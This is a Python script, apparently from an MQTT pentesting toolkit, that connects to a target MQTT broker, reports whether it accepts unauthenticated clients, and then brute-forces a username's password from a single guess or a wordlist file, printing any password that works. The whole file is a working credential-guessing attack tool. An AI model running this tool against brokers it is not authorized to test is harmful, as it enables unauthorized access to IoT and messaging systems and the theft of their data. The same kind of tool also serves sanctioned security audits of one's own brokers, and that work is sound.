import sys
import time
import socket
from parsers import auth_parser
from utils import printmessage, rc_msgs, on_message, printarg
from termcolor import colored
import paho.mqtt.client as mqttclient

no_auth = False
checked = False
found = False


def on_connect(client, userdata, flags, rc) :
    global connected, no_auth, checked
    if rc == 0 :
        connected = True
        if not checked :
            no_auth = True
        else :
            printmessage(f"Password for {username} is {password}", 'success', flush=True)
            global found
            found = True
    elif rc == 4 or rc == 5 :
            printmessage(f"Password {password} for {username}  is Invalid", 'error', flush=True)

    else :
        printmessage(rc_msgs[rc], 'error', flush=True)




args = auth_parser.parse_args()


host = args.host
port = args.port if args.port is not None else 1883
username = args.username
password = args.password
filepath = args.filepath

# client = mqttclient.Client(client_id='MQTT Implementation - Authentication Breaker')
client = mqttclient.Client(mqttclient.CallbackAPIVersion.VERSION1, client_id='MQTT Implementation - Authentication Breaker')




client.on_connect = on_connect

try :
    client.connect(host)
except socket.gaierror :
    printmessage("The IP address or domain name of the broker is not known", 'error', flush=True)
    sys.exit(1)

except ConnectionRefusedError :
    printmessage('''Connection refused. Check if the broker is running and the correct port is given. Check if there is any firewall blocking connection''', 'error', flush=True)
    sys.exit(1)


topic = "topic"
message = "message"

client.publish(topic, message)

client.loop_start()

client.loop_stop()

if no_auth :
    printmessage("The target MQTT broker does not need any authentication", 'success', flush=True)
    sys.exit(0)

checked = True
if password is not None :
    client.username_pw_set(username, password)

    client.on_connect = on_connect

    try :
        client.connect(host)
    except socket.gaierror :
        printmessage("The IP address or domain name of the broker is not known", 'error',flush=True)
        sys.exit(1)

    except ConnectionRefusedError :
        printmessage('''Connection refused. Check if the broker is running and the correct port is given. Check if there is any firewall blocking connection''', 'error',flush=True)
        sys.exit(1)


    topic = "topic"
    message = "message"

    client.publish(topic, message)

    client.loop_start()

    client.loop_stop()


if filepath is not None :

    try :
        f = open(filepath)
    except FileNotFoundError as e :
        printmessage(str(e), 'error')
        sys.exit(0)


    for line in f:
        password = line.strip()
        client.username_pw_set(username, password)
        userdata = {'username': username, 'password': password}
        client.user_data_set(userdata)
        client.connect(host, port)
        client.loop_start()
        time.sleep(1)
        client.loop_stop()
        if found:
            exit(0)
    printmessage("No password matches the credentials", 'error', flush=True)